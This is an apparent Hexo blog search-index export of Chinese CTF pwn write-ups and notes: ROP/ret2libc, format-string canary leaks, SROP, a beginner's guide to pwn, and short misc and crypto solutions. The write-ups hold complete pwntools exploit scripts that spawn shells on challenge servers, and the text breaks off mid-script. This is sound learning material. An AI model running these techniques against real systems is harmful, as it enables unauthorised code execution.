<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>(HarekazeCTF2019)baby_rop2</title>
    <url>/2021/06/28/HarekazeCTF2019-baby-rop2/</url>
    <content><![CDATA[<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210628183434726.png" alt="image-20210628183434726"></p>
<p>IDA打开，查看main函数，发现buf大小为0x20,而读入的大小为0x100，存在溢出漏洞</p>
<p><img src="/img/image-20210628183509508.png" alt="image-20210628183509508"></p>
<p>再用shift+F12查找字符串，没有发现system(‘/bin/sh’)。</p>
<p><img src="/img/image-20210628185049992.png" alt="image-20210628185049992"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.buf大小0x20，读入0x100，溢出漏洞，通过利用漏洞覆盖返回地址为system(‘/bin/sh’)</p>
<p>2.利用read函数，泄露libc基址，然后获取system和/bin/sh字符串的地址</p>
<p>3.最后将一二步合并完成夺权</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>泄露libc基址</p>
<p>因为printf函数中有两个参数要设置，所以就要找到rsi和rdi寄存器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210628202925156.png" alt="image-20210628202925156"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 |grep <span class="string">&quot;pop rsi&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210628203023369.png" alt="image-20210628203023369"></p>
<p>看见rsi后面跟有r15，我们直接设置为0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br></pre></td></tr></table></figure>

<p>1.b‘a’*0x28–&gt;造成溢出，覆盖到了返回地址<br>2.p64(pop_rdi)+p64(format_str)–&gt;我们在原本语句的返回地址上写入了pop_rdi,ret，pop_rdi，对应参数format_str,执行后将formast_str的值设置给了rdi，之后执行ret（返回指令）<br>3.p64(pop_rsi_r15)+p64(read_got)+p64(0)–&gt; 我们将2中的ret写成了pop_rsi,pop_r15,ret;执行指令pop_rsi对应参数read_got,将rsi寄存器的值设置成了read函数的got表地址，pop_r15对应参数0，由于我们不用r15，随便设置一下它，我是设置成了0<br>4.p64(printf_plt)–&gt;将3中的ret设置成printf函数的plt表地址，实际上就是printf函数的地址，去执行printf函数，输出我们设置的read函数的地址<br>5.p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system‘（/bin/sh）’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)  <span class="comment">#利用libcsearcher库去查找匹配的libc版本</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)  <span class="comment">#计算程序里的偏移量</span></span><br></pre></td></tr></table></figure>

<p>计算system和(‘/bin/sh’)的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29233</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span> </span><br><span class="line">format_str = <span class="number">0x400770</span>  <span class="comment">#%s所在字符串</span></span><br><span class="line">ret_addr = <span class="number">0x400734</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后拿flag时，发现flag还没有放在根目录下，需要find -name “flag”去查找，最后cat flag</p>
<p><img src="/img/image-20210628210723648.png" alt="image-20210628210723648"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn入门指南</title>
    <url>/2021/10/20/PWN%E2%80%94%E2%80%94%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="PWN——从入门到入土"><a href="#PWN——从入门到入土" class="headerlink" title="PWN——从入门到入土"></a>PWN——从入门到入土</h1><h3 id="咚-咚-咚"><a href="#咚-咚-咚" class="headerlink" title="咚!咚!咚!"></a>咚!咚!咚!</h3><hr>
<p><del>从入门到入土之路开始了</del></p>
<blockquote>
<p>”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了 。</p>
</blockquote>
<p>在CTF比赛中，pwn题主要是考察对<strong>二进制漏洞的发掘和利用</strong>，在此之上你必须要对<strong>计算机操作系统</strong>的 底层有一定的了解，这也是为什么pwn的入门门槛是所有方向中最高的原因之一。当然如果你是0基础的<strong>猛新</strong>也不用担心，因为基本上没有人是在所有关于操作系统的课程都上完过后才去学习pwn的，ctf为你提供了一个学习的平台，你可以一边拓展你的知识面一边享受pwn的乐趣。</p>
<h2 id="学习Pwn，你必须了解或掌握的知识"><a href="#学习Pwn，你必须了解或掌握的知识" class="headerlink" title="学习Pwn，你必须了解或掌握的知识"></a>学习Pwn，你必须了解或掌握的知识</h2><ol>
<li><strong>C语言</strong></li>
<li><strong>汇编语言</strong></li>
<li><strong>最基础的python</strong></li>
<li><strong>IDA等pwntools的使用</strong></li>
<li><strong>计算机组成原理</strong></li>
<li><strong>计算机操作系统</strong></li>
<li><strong>编译原理</strong></li>
</ol>
<p>这里推荐两本相关书籍，有意学习<strong>Pwn</strong>方向的同学可以留心一下</p>
<ul>
<li><strong>《CTF竞赛权威指南 pwn篇》</strong>（方便快速入门）</li>
<li><strong>《汇编语言（第4版）》</strong>（王爽著）</li>
</ul>
<p>同时这里也建议多关注一些论坛，比如吾爱破解，安全客，先知社区，freebuf，看雪等等，在这上面你 能学到不少漏洞利用相关姿势，可以在摸鱼的时候浏览查看</p>
<h2 id="Pwn的解题流程"><a href="#Pwn的解题流程" class="headerlink" title="Pwn的解题流程"></a>Pwn的解题流程</h2><h3 id="1-关于环境"><a href="#1-关于环境" class="headerlink" title="1.关于环境"></a>1.关于环境</h3><p>如果你是windows平台的话，首先你需要一台<strong>linux虚拟机</strong>，这里推荐使用<strong>ubuntu18.04</strong>，因为大多数 pwn题的部署环境都是<strong>ubuntu</strong>，便于你本地的调试，有了这样一台虚拟机后，你就可以在上面本地或者 远程调试pwn题了 <del>（但我个人也在经常使用<strong>kali</strong>，因为自带pwntools，解题有时还是很方便的）</del></p>
<p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢，可以在清华镜像源里去下载需要的Linux版本</p>
<p>同时，你需要安装pwntools这个python库，它是你在面对pwn题时最有力的工具，用它来get一个个 shell吧（安装方法详情请见百度） 在windows下你则需要<strong>IDA</strong>这个静态分析工具，建议在做题之前先在网上好好了解一下IDA的使用，会极大方便接下来的做题</p>
<h3 id="2-举个栗子"><a href="#2-举个栗子" class="headerlink" title="2.举个栗子"></a>2.举个栗子</h3><p>拿到一个pwn题，第一时间便是<strong>检查保护机制</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>|ret<span class="number">2</span>text checksec ret<span class="number">2</span>text<span class="number">2</span>|Arch: i<span class="number">386</span>-<span class="number">32</span>-little<span class="number">3</span>|RELRO: Partial RELRO<span class="number">4</span>|Stack: No canary found<span class="number">5</span>|NX: NX enabled<span class="number">6</span>|PIE: No PIE (<span class="number">0</span>x<span class="number">8048000</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>arch</strong>即程序所采用的架构，由上可知这是一个x86架构下的32位程序 </li>
<li><strong>RELRO</strong>(Relocation Read Only)，重定位表只读，这个保护并未完全开启，若完全开启则got表与 plt表只读不可写 </li>
<li><strong>canary</strong>，语义意为金丝雀； Stack canary 保护机制在刚进入函数时，在栈上放置一个标志 canary ，然后 在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生，同时结束程序运行。同上这个保护也未开启</li>
<li> <strong>NX</strong>(栈不可执行)，NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当 攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种 方法绕过</li>
<li> <strong>PIE</strong>(Position-Independent Executable, 位置无关可执行文件)，即程序运行时各个段（如代码段 等）加载的虚拟地址也是在装载时才确定</li>
</ul>
<p><strong>第二步</strong>，使用<strong>IDA静态工具</strong>查看ELF文件，通过反编译查看伪代码，读懂文件的内容，然后利用相应的方法解题(格式化字符串，栈溢出，整数溢出，堆溢出……)</p>
<p>一般到最后，就会利用python编写脚本（exp），然后拿到题目的flag</p>
<p><del>（不过最简单的pwn题，你只需要通过nc连接题目靶机端口，然后cat flag就能拿到flag）</del></p>
<p><img src="http://pr0b1em.top/img/cat.jpg" alt="img"></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="Pwner-pwn-for-what"><a href="#Pwner-pwn-for-what" class="headerlink" title="Pwner: pwn for what?"></a>Pwner: pwn for what?</h3><hr>
<p>就CTF比赛这几个大类来看，pwn无疑是入门门槛最高的一个方向。它要求你具备以下基本能力：</p>
<ul>
<li>代码审计能力 </li>
<li>对整体程序流的认知与把握 </li>
<li>发掘程序中的漏洞点 </li>
<li>善用所有可利用的漏洞点来发起攻击</li>
</ul>
<h4 id="金句"><a href="#金句" class="headerlink" title="金句"></a>金句</h4><p>在整个getshell的过程中，困难是其次的，重要的是保持<strong>耐心与热情</strong>；在每个pwner的生涯中或许都会有过长久不能入眠的夜晚，面对屏幕上的一行行代码，逐行分析每个字符，思索各种可能存在的漏洞······最终，你或能在交互后成功在命令行里输入cat flag ，亦或在疑惑中查询他人的wp，无论结果与否，在潜移默化之中，你都在朝着未来的<strong>pwn master</strong>的方向砥砺前行。当你在CTF众多分支里选择Pwn的时候，摆在你面前的就不是一条轻松的道路，关于二进制的研究都是如此，所有的pwner都是从萌新一步步逐渐挣扎着、努力变成大佬的，毕竟在拿到shell后心里默念的”hacked by xxx”之中的喜悦之情是什么都难以掩藏的吧！</p>
<blockquote>
<p>Hack Just For Fun</p>
<p>双手合十成为自己的神，双手张开比肩神明</p>
</blockquote>
<p>希望你能在黑暗中探寻光明的道路，用你内心无尽的热爱点燃这Pwn世界。</p>
<blockquote>
<p><strong>XJUSEC{Love_Pwn_Forever!}</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>SROP</title>
    <url>/2021/06/28/SROP/</url>
    <content><![CDATA[<h1 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h1><p>Srop 的全称是Sigreturn Oriented Programming</p>
<p>Srop 可以理解成一种高级的ROP，利用了linux下15号系统调用的-&gt;rt_sigreturn</p>
<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal是Unix系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息</p>
<p>常见于在一个进程中，内核向其发送发送软中断信号，该进程将暂时被挂起，系统进入内核态</p>
<p>因为是暂时被挂起，所以系统会保留该进程的上下文  (部分内容摘自ctf-wiki)</p>
<pre><code>将所有的寄存器压入栈中，以及signal信息和指向sigreturn的系统调用地址在栈顶上放置rt_sigreturn
</code></pre>
<p>此时栈上的内存分布：<br><img src="/img/14487175105930.png!small.jpg"></p>
<p>这一段内存也被称为<strong>Signal Frame</strong></p>
<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><pre><code>Signal Frame 被放置在用户进程的内存空间中，也就说Signal Frame是可以读写的

在恢复Signal信号的时候没有检测，也就是说我们可以通过改变Signal Frame中的信息来劫持控制流
</code></pre>
<p>例如：<br>  1  | rax = 59//对应59号系统调用-&gt; exceve<br>  2  | rdi = ‘/bin/sh’<br>  3  | rsi = 0<br>  4  | rdx = 0</p>
<p>这样就能进行一个最简单的Srop</p>
<h2 id="Srop链"><a href="#Srop链" class="headerlink" title="Srop链"></a>Srop链</h2><p>有时候我们希望执行一系列的操作,此时可以通过syscall ret;这个gadget去串联起我们我们的Srop链</p>
<p>执行完一个SignalFrame接着执行下一个SignalFrame。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>unctf-fo</title>
    <url>/2022/01/21/UNCTF%E2%80%94%E2%80%94fo/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="UNCTF——fo"><a href="#UNCTF——fo" class="headerlink" title="UNCTF——fo"></a>UNCTF——fo</h2><p>我真是个傻逼！这题目就是拿来自己打醒自己的，比赛卡了一晚上，一度怀疑是自己字符串漏洞没学好，研究一晚格式化字符串，结果wp出来一看，计算偏移量搞错，我真是个大傻逼！！！</p>
<p>检查保护机制，64位，开NX和canary</p>
<p><img src="/img/1643120080074.png" alt="1643120080074"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>题目里printf函数，可以直接格式化字符串漏洞溢出canary地址，然后覆盖夺权，思路很简单。</p>
<p><img src="/img/1643120093467.png" alt="1643120093467"></p>
<p>但我是万万没想到啊，栽在自己手里</p>
<p><img src="/img/1643120109339.png" alt="1643120109339"></p>
<p>从头到尾，一共0x58的大小，我偏偏忘掉减canary地址，以至于整个题卡住，我是傻逼！！！</p>
<p>最后就不用多说了</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.binary=&#x27;fo&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&#x27;./fo&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36041</span> )</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x4008e3</span></span><br><span class="line">backdoor=<span class="number">0x40080D</span></span><br><span class="line">main=<span class="number">0x400823</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;you?&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;%17$p&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(backdoor)</span><br><span class="line"><span class="comment">#r.recvuntil(&quot;...&quot;)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>总的来说，题目很好，下次不会再犯傻逼错误了，省赛加油！</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>UUCTF writeup</title>
    <url>/2023/05/30/UUCTF%20writeup/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="UUCTF-writeup"><a href="#UUCTF-writeup" class="headerlink" title="UUCTF writeup"></a>UUCTF writeup</h1><h3 id="writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配"><a href="#writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配" class="headerlink" title="writer:Pr0b1em(小菜鸡二进制选手，目标全栈选手，不配)"></a>writer:Pr0b1em<del>(小菜鸡二进制选手，目标全栈选手，不配)</del></h3><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p>下载附件，先检查保护机制，只开了NX，64位文件</p>
<p><img src="/img/1666613003904.png" alt="1666613003904"></p>
<p>拖入IDA查看，分别查看main函数和字符串，找到关键字符串system和bin/sh，同时发现了vuln函数，继续跟进</p>
<p><img src="/img/1666613080677.png" alt="1666613080677"></p>
<p><img src="/img/1666613062494.png" alt="1666613062494"></p>
<p><img src="/img/1666613139782.png" alt="1666613139782"></p>
<p>发现buf此处，其中存在栈溢出，同时发现back_door函数，现成直接用 </p>
<p><img src="/img/1666613319147.png" alt="1666613319147"></p>
<p>构造脚本</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&quot;&quot;,)</span></span><br><span class="line">r=process(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400734</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h3><p><strong>花式栈溢出</strong></p>
<p>检查保护机制，开了NX和PIE,说明基地址随机，估计得碰运气</p>
<p><img src="/img/1666614235498.png" alt="1666614235498"></p>
<p>IDA打开，发现内容和上一题几乎一样，唯独不同的点就是溢出空间只够一个后门函数的地址，于是撰写脚本，因为基地址为止，需要碰，所以脚本些许变化</p>
<p><img src="/img/1666614380686.png" alt="1666614380686"></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#p=process(&#x27;./babystack&#x27;)</span></span><br><span class="line">        p=remote(<span class="string">&quot;43.143.7.127&quot;</span>,<span class="number">28054</span>)</span><br><span class="line">        elf=ELF(<span class="string">&#x27;./easystack&#x27;</span>)</span><br><span class="line">        context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">        backdoor=<span class="number">0x1185</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h3 id="just-rce"><a href="#just-rce" class="headerlink" title="just rce"></a>just rce</h3><p>简单的rce，通过rev指令逆序输出就得到flag，后面配上通配符绕过关键字</p>
<p><img src="/img/1666618211863.png" alt="1666618211863"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Where-is-flag？"><a href="#Where-is-flag？" class="headerlink" title="Where is flag？"></a>Where is flag？</h3><p>流量分析，wireshark打开后导出特定分组http，发现有个flag压缩包，打开文件发现是png图片格式，010打开，这里发现缺少头文件，于是修复好，发现是个二维码，扫出来的内容存在零宽容度字符，在线网站解密得到flag。</p>
<p><img src="/img/1666777976579.png" alt="1666777976579"></p>
<h3 id="搬好小板凳听故事"><a href="#搬好小板凳听故事" class="headerlink" title="搬好小板凳听故事"></a>搬好小板凳听故事</h3><p>简单的解决，用ciphey，好一个三花淡奶！</p>
<p><img src="/img/1666778096125.png" alt="1666778096125"></p>
<h3 id="村中奇怪的故事"><a href="#村中奇怪的故事" class="headerlink" title="村中奇怪的故事"></a>村中奇怪的故事</h3><p>这玩意儿图片真给我误导了，没想到就是百家姓加密，后来仔细一看悟出来了，赶紧去试，后来七七上hint也验证了我的想法。说真的，这故事够狗屎，给我看得一愣一愣，解出来之后，居然平台后台flag还是错的，给我整得怀疑人生。</p>
<h3 id="蜜蜂和蛆"><a href="#蜜蜂和蛆" class="headerlink" title="蜜蜂和蛆"></a>蜜蜂和蛆</h3><p>crc32爆破，通过pass1和pass2分别得到一段密码，然后打开得到一张画着蜜蜂和蛆的png，改宽高，得到一个二维码，扫出来base64解密，<del>文件都删完了，懒得复现了</del></p>
<h3 id="王八快跑"><a href="#王八快跑" class="headerlink" title="王八快跑"></a>王八快跑</h3><p>让你跑你就跑，签个到！哈哈哈哈</p>
<h3 id="略略略来抓我啊"><a href="#略略略来抓我啊" class="headerlink" title="略略略来抓我啊"></a>略略略来抓我啊</h3><p>社工还是不太擅长，很久没做过了，找了很久，第一张图暴露了一个钱塘驿，直接暴露了位置，然后就找着地图找宾馆，是个眼力活，也是个体力活</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="websign"><a href="#websign" class="headerlink" title="websign"></a>websign</h3><p>F12不管用？那我手动总行了吧！</p>
<p><img src="/img/1666778791713.png" alt="1666778791713"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="爱丽丝梦境的兔子"><a href="#爱丽丝梦境的兔子" class="headerlink" title="爱丽丝梦境的兔子"></a>爱丽丝梦境的兔子</h3><p>兔子密码、社会主义核心价值观密码和栅栏密码，简单套娃</p>
<h3 id="disparity-rsa"><a href="#disparity-rsa" class="headerlink" title="disparity_rsa"></a>disparity_rsa</h3><p>这个rsa有手就行，我直接用RsaCTFtools解的，脚本都懒得写了，这里就不放图复现了<del>（是真的懒</del></p>
<h3 id="Easy-base64"><a href="#Easy-base64" class="headerlink" title="Easy_base64"></a>Easy_base64</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 这里有个固定的字符串是flag</span></span><br><span class="line"><span class="comment"># 1.根据flag的base64编码可以确定第一个字符的ASCII码对应的是90</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#125;&#x27;</span></span><br><span class="line">tmp = base64.b64encode(<span class="built_in">bytes</span>(flag,<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(tmp))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.根据结果往前推ASCII码</span></span><br><span class="line">a = [<span class="number">90</span>, <span class="number">55</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">30</span>, <span class="number">34</span>, <span class="number">16</span>, <span class="number">50</span>,<span class="number">111</span>,<span class="number">74</span>, <span class="number">62</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">54</span>, <span class="number">52</span>,<span class="number">106</span>, <span class="number">85</span>, <span class="number">31</span>, <span class="number">54</span>, <span class="number">24</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">11</span>, <span class="number">38</span>, <span class="number">1</span>, <span class="number">53</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">17</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">40</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">54</span>, <span class="number">25</span>, <span class="number">111</span>, <span class="number">77</span>, <span class="number">16</span>, <span class="number">48</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">9</span>, <span class="number">55</span>, <span class="number">108</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)-<span class="number">1</span>):</span><br><span class="line">    t = a[i] ^ a[i+<span class="number">1</span>]</span><br><span class="line">    a[i+<span class="number">1</span>] = t</span><br><span class="line">    <span class="built_in">print</span>(t, end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">109,34,5,34,91,46,73,21,50,55,60,50,34,93,37,116,59,23,36,2,94,63,74,41,46,119,60,88,45,39,52,36,52,52,50,12,15,20,28,42,11,50,20,25,47,118,34,93,32,42,59,40,62,91,108,56</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">b = [<span class="number">90</span>, <span class="number">109</span>,<span class="number">120</span>,<span class="number">104</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">116</span>,<span class="number">122</span>,<span class="number">97</span>,<span class="number">72</span>,<span class="number">86</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">115</span>,<span class="number">77</span>,<span class="number">72</span>,<span class="number">90</span>,<span class="number">108</span>,<span class="number">88</span>,<span class="number">50</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">78</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">71</span>,<span class="number">70</span>,<span class="number">115</span>,<span class="number">98</span>,<span class="number">71</span>,<span class="number">86</span>,<span class="number">117</span>,<span class="number">90</span>,<span class="number">122</span>,<span class="number">78</span>,<span class="number">102</span>,<span class="number">100</span>,<span class="number">109</span>,<span class="number">86</span>,<span class="number">121</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">84</span>,<span class="number">78</span>,<span 